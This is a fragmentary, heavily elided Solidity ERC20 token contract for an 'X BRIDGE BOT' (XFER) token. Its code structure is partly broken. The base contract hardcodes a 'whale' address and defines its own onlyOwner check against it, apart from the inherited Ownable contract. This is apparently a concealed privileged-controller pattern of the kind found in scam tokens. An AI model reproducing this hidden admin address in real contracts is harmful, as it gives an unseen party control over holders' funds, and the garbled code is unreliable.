...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    string public XFERnuwebsite = "https://XFER.com/";
    string public XFERnuADDRESS = "0xA1DD77a35768770973Da8651108BC5c4C380D226";
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _name;
    string private _symbol;
    address private WhaleXFERnu;
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
       _decimals = 9;
         WhaleXFERnu = 0xA1DD77a35768770973Da8651108BC5c4C380D226;      
    }
    ...
    function _burn(address account, uint256 amount) internal virtual {
        ...
        _afterTokenTransfer(account, address(0), amount);
              ...
              function getXFERnuwebsite() public view returns (string memory) {
        return XFERnuwebsite;
    } 


               function getXFERnuADDRESS() public view returns (string memory) {
        return XFERnuADDRESS;
    }    
      modifier onlyOwner() {
         require(_msgSender() == WhaleXFERnu);
        _;
    }    
    function _approve(
        address owner,
...
contract XFER is ERC20, Ownable {
    constructor () ERC20("X BRIDGE BOT", "XFER") 
    {    
